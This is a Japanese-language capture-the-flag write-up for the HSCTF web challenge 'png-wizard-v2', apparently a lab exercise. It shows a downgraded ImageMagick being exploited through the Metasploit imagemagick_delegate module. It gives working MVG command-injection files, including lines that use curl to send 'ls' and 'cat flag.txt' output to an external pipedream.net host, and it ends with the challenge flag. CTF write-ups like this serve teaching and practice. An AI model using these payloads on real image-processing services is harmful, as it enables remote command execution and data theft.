# png-wizard-v2:web:459pts
Looks like some intern messed up, we've reverted to an older version for now.  
[http://web1.hsctf.com:8005/](http://web1.hsctf.com:8005/)  
Downloads  
[png-wizard-v2.zip](png-wizard-v2.zip)  

# Solution
URLとソースが配布されている。  
どうやら[png-wizard](../png-wizard/)の強化問題のようだ。  
サイトの構成は変わっていない。  
PNG Wizard  
[site1.png](site/site1.png)  
こちらもバージョンなどが詳細に表示されている。  
[site2.png](site/site2.png)  
ここでImageMagickのバージョンが6.9.10-23から6.8.9-9に変わっていることがわかる。  
明らかに下がっているため、Exploitしろとのことだと予想できる。  
Metasploitでペイロードを探すと以下のようなものが見つかる。  
```bash
$ msfconsole
~~~
msf6 > search ImageMagick

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/unix/webapp/coppermine_piceditor             2008-01-30       excellent  Yes    Coppermine Photo Gallery picEditor.php Command Execution
   1  exploit/multi/fileformat/ghostscript_failed_restore  2018-08-21       excellent  No     Ghostscript Failed Restore Command Execution
   2  exploit/unix/fileformat/ghostscript_type_confusion   2017-04-27       excellent  No     Ghostscript Type Confusion Arbitrary Command Execution
   3  exploit/unix/fileformat/imagemagick_delegate         2016-05-03       excellent  No     ImageMagick Delegate Arbitrary Command Execution


Interact with a module by name or index. For example info 3, use 3 or use exploit/unix/fileformat/imagemagick_delegate
```
`exploit/unix/fileformat/imagemagick_delegate`を利用してペイロードを作成してみる。  
編集のしやすさのためmvgを選択する。  
```bash
msf6 > use 3
[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(unix/fileformat/imagemagick_delegate) > set payload payload/cmd/unix/generic
payload => cmd/unix/generic
msf6 exploit(unix/fileformat/imagemagick_delegate) > set CMD sleep 10
CMD => sleep 10
msf6 exploit(unix/fileformat/imagemagick_delegate) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   SVG file
   1   MVG file
   2   PS file


msf6 exploit(unix/fileformat/imagemagick_delegate) > set target 1
target => 1
msf6 exploit(unix/fileformat/imagemagick_delegate) > exploit

[+] msf.png stored at /msf.png
msf6 exploit(unix/fileformat/imagemagick_delegate) > exit
$ cat /msf.png
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|sleep 10'
pop graphic-context
pop graphic-context
```
出来上がったファイルをサイトに送信すると、応答が遅れた。  
コマンドが実行できるようなのでcurlを内部で走らせ、実行結果を外部でキャッチする。  
まずは以下のファイルでlsを行う。  
```bash
$ cat ls.png
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|curl xxxxxxxxxxxxx.x.pipedream.net?s=`ls`'
pop graphic-context
pop graphic-context
```
`/?s=flag.txt`のリクエストを得たので、以下のファイルでcatする。  
```bash
$ cat get_flag.png
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|curl xxxxxxxxxxxxx.x.pipedream.net?s=`cat flag.txt`'
pop graphic-context
pop graphic-context
```
`/?s=flagdid_you_ever_hear_the_tragedy_of_darth_imagemagick_the_wise_6889108`のリクエストを得た。  
消えた`{`と`}`を修正してやればflagとなった。  

## flag{did_you_ever_hear_the_tragedy_of_darth_imagemagick_the_wise_6889108}